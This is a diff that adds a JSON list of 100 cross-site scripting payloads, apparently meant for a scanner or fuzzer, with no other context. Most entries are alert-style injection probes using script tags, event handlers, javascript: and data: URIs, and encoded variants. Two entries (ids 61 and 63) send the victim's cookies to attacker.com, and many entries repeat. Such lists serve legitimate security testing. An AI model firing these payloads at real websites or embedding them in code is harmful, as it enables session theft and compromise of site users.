@@ -1,0 +1,403 @@
+[
+  {
+    "id": 1,
+    "payload": "<script>alert(1)</script>"
+  },
+  {
+    "id": 2,
+    "payload": "%3Cscript%3Ealert(1)%3C/script%3E"
+  },
+  {
+    "id": 3,
+    "payload": "javascript:alert(1)"
+  },
+  {
+    "id": 4,
+    "payload": "\";alert(1);//"
+  },
+  {
+    "id": 5,
+    "payload": "');alert(1)//"
+  },
+  {
+    "id": 6,
+    "payload": "');alert(String.fromCharCode(88,83,83))//"
+  },
+  {
+    "id": 7,
+    "payload": "<img src=x onerror=alert(1)>"
+  },
+  {
+    "id": 8,
+    "payload": "onmouseover=\"alert(1)\""
+  },
+  {
+    "id": 9,
+    "payload": "%22onmouseover=%22alert(1)"
+  },
+  {
+    "id": 10,
+    "payload": "<body/onload=alert(1)>"
+  },
+  {
+    "id": 11,
+    "payload": "<svg/onload=alert(1)>"
+  },
+  {
+    "id": 12,
+    "payload": "javascript:document.write('<script>alert(1)</script>')"
+  },
+  {
+    "id": 13,
+    "payload": "<iframe src='javascript:alert(1)'></iframe>"
+  },
+  {
+    "id": 14,
+    "payload": "<a href='javascript:alert(1)'>Click me</a>"
+  },
+  {
+    "id": 15,
+    "payload": "javascript:prompt(1)"
+  },
+  {
+    "id": 16,
+    "payload": "<iframe src='javascript:alert(1)'></iframe>"
+  },
+  {
+    "id": 17,
+    "payload": "<b/onmouseover=alert(1)>test</b>"
+  },
+  {
+    "id": 18,
+    "payload": "%27%3E%22%3Csvg/onload=alert(1)%3E"
+  },
+  {
+    "id": 19,
+    "payload": "<image src=x onerror=alert(1)>"
+  },
+  {
+    "id": 20,
+    "payload": "javascript://%0Aalert(1)"
+  },
+  {
+    "id": 21,
+    "payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+  },
+  {
+    "id": 22,
+    "payload": "javascript:alert`1`"
+  },
+  {
+    "id": 23,
+    "payload": "\"<svg/onload=alert(1)>\""
+  },
+  {
+    "id": 24,
+    "payload": "javascript:window.onerror=alert;throw 1"
+  },
+  {
+    "id": 25,
+    "payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+  },
+  {
+    "id": 26,
+    "payload": "javascript:window.onerror=alert;throw 1"
+  },
+  {
+    "id": 27,
+    "payload": "javascript:alert(1)//"
+  },
+  {
+    "id": 28,
+    "payload": "javascript:confirm(1)"
+  },
+  {
+    "id": 29,
+    "payload": "javascript:eval('alert(1)')"
+  },
+  {
+    "id": 30,
+    "payload": "alert(1)//"
+  },
+  {
+    "id": 31,
+    "payload": "data:,alert(1)"
+  },
+  {
+    "id": 32,
+    "payload": "alert%28document.domain%29"
+  },
+  {
+    "id": 33,
+    "payload": "javascript:alert%28%22XSS%22%29"
+  },
+  {
+    "id": 34,
+    "payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+  },
+  {
+    "id": 35,
+    "payload": "data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"
+  },
+  {
+    "id": 36,
+    "payload": "javascript://%0Aalert%281%29"
+  },
+  {
+    "id": 37,
+    "payload": "javascript:alert%281%29"
+  },
+  {
+    "id": 38,
+    "payload": "http://example.com/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+  },
+  {
+    "id": 39,
+    "payload": "http://example.com/?q=%27%3Balert(1)//"
+  },
+  {
+    "id": 40,
+    "payload": "<body background='javascript:alert(1)'>"
+  },
+  {
+    "id": 41,
+    "payload": "http://example.com/?test=%22%27><svg/onload=alert(1)>"
+  },
+  {
+    "id": 42,
+    "payload": "<script src='data:text/javascript,alert(1)'></script>"
+  },
+  {
+    "id": 43,
+    "payload": "<svg><script>alert(1)</script>"
+  },
+  {
+    "id": 44,
+    "payload": "<img src='javascript:alert(1)'/>"
+  },
+  {
+    "id": 45,
+    "payload": "<iframe src='javascript:alert(1)'></iframe>"
+  },
+  {
+    "id": 46,
+    "payload": "%22onmouseover=alert(1)//"
+  },
+  {
+    "id": 47,
+    "payload": "javascript:alert(String.fromCharCode(88,83,83))"
+  },
+  {
+    "id": 48,
+    "payload": "javascript://%0Aalert%281%29"
+  },
+  {
+    "id": 49,
+    "payload": "data:text/html,<svg%20onload=alert(1)>"
+  },
+  {
+    "id": 50,
+    "payload": "javascript:window.onerror=alert;throw%20%22test%22"
+  },
+  {
+    "id": 51,
+    "payload": "%3Cscript%3Ealert(document.domain)%3C/script%3E"
+  },
+  {
+    "id": 52,
+    "payload": "%3Csvg%20onload=alert(1)%3E"
+  },
+  {
+    "id": 53,
+    "payload": "javascript:document.write('<script>alert(document.domain)</script>')"
+  },
+  {
+    "id": 54,
+    "payload": "<img src=x onerror=alert(1)>"
+  },
+  {
+    "id": 55,
+    "payload": "<body onpageshow=alert(1)>"
+  },
+  {
+    "id": 56,
+    "payload": "http://example.com/%27%3Balert(1)"
+  },
+  {
+    "id": 57,
+    "payload": "%3Ciframe%20src%3D%22javascript:alert(1)%22%3E%3C/iframe%3E"
+  },
+  {
+    "id": 58,
+    "payload": "javascript:window.onerror=alert;throw%20'error'"
+  },
+  {
+    "id": 59,
+    "payload": "<script src=javascript:alert(1)>"
+  },
+  {
+    "id": 60,
+    "payload": "<svg/onload=alert(1)>"
+  },
+  {
+    "id": 61,
+    "payload": "javascript:void(document.location='http://attacker.com?'+document.cookie)"
+  },
+  {
+    "id": 62,
+    "payload": "<script>alert(/XSS/)</script>"
+  },
+  {
+    "id": 63,
+    "payload": "javascript:document.location='http://attacker.com/?cookie='+document.cookie"
+  },
+  {
+    "id": 64,
+    "payload": "http://example.com/?q=%3Cscript%3Ealert(1)%3C/script%3E"
+  },
+  {
+    "id": 65,
+    "payload": "<object data=javascript:alert(1)>"
+  },
+  {
+    "id": 66,
+    "payload": "<embed src=javascript:alert(1)>"
+  },
+  {
+    "id": 67,
+    "payload": "javascript:void(alert(1))"
+  },
+  {
+    "id": 68,
+    "payload": "%27%3E%3Cimg%20src=x%20onerror=alert(1)%3E"
+  },
+  {
+    "id": 69,
+    "payload": "javascript://%0Aalert(1)"
+  },
+  {
+    "id": 70,
+    "payload": "javascript:window.onerror=alert;throw%201"
+  },
+  {
+    "id": 71,
+    "payload": "%27% 3E%3Csvg/onload=alert(1)%3E"
+  },
+  {
+    "id": 72,
+    "payload": "<svg/onload=alert(1)>"
+  },
+  {
+    "id": 73,
+    "payload": "<iframe src=javascript:alert(1)>"
+  },
+  {
+    "id": 74,
+    "payload": "<svg/onload=alert(1)>"
+  },
+  {
+    "id": 75,
+    "payload": "javascript:alert%281%29"
+  },
+  {
+    "id": 76,
+    "payload": "http://example.com/?q=%3Csvg%2Fonload%3Dalert(1)%3E"
+  },
+  {
+    "id": 77,
+    "payload": "javascript:alert(1)"
+  },
+  {
+    "id": 78,
+    "payload": "%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E"
+  },
+  {
+    "id": 79,
+    "payload": "<body/onload=alert(1)>"
+  },
+  {
+    "id": 80,
+    "payload": "javascript:window.onerror=alert;throw%20%22test%22"
+  },
+  {
+    "id": 81,
+    "payload": "<script>alert(document.cookie)</script>"
+  },
+  {
+    "id": 82,
+    "payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+  },
+  {
+    "id": 83,
+    "payload": "javascript:alert`1`"
+  },
+  {
+    "id": 84,
+    "payload": "<b/onmouseover=alert(document.cookie)>test</b>"
+  },
+  {
+    "id": 85,
+    "payload": "%22onmouseover=alert(1)//"
+  },
+  {
+    "id": 86,
+    "payload": "javascript:alert`1`"
+  },
+  {
+    "id": 87,
+    "payload": "data:text/html,<svg%20onload=alert(1)>"
+  },
+  {
+    "id": 88,
+    "payload": "javascript:alert(document.cookie)"
+  },
+  {
+    "id": 89,
+    "payload": "http://example.com/?test=%22%27><svg/onload=alert(1)>"
+  },
+  {
+    "id": 90,
+    "payload": "<svg><script>alert(1)</script>"
+  },
+  {
+    "id": 91,
+    "payload": "<img src='javascript:alert(1)'/>"
+  },
+  {
+    "id": 92,
+    "payload": "javascript:void(alert(1))"
+  },
+  {
+    "id": 93,
+    "payload": "<iframe src=javascript:alert(1)>"
+  },
+  {
+    "id": 94,
+    "payload": "%3Cscript%3Ealert(document.domain)%3C/script%3E"
+  },
+
+  {
+    "id": 95,
+    "payload": "%3Csvg%20onload=alert(1)%3E"
+  },
+  {
+    "id": 96,
+    "payload": "<body onpageshow=alert(1)>"
+  },
+  {
+    "id": 97,
+    "payload": "http://example.com/%27%3Balert(1)"
+  },
+  {
+    "id": 98,
+    "payload": "%3Ciframe%20src%3D%22javascript:alert(1)%22%3E%3C/iframe%3E"
+  },
+  {
+    "id": 99,
+    "payload": "javascript:window.onerror=alert;throw%20'error'"
+  },
+  {
+    "id": 100,
+    "payload": "<script src=javascript:alert(1)>"
+  }
+]
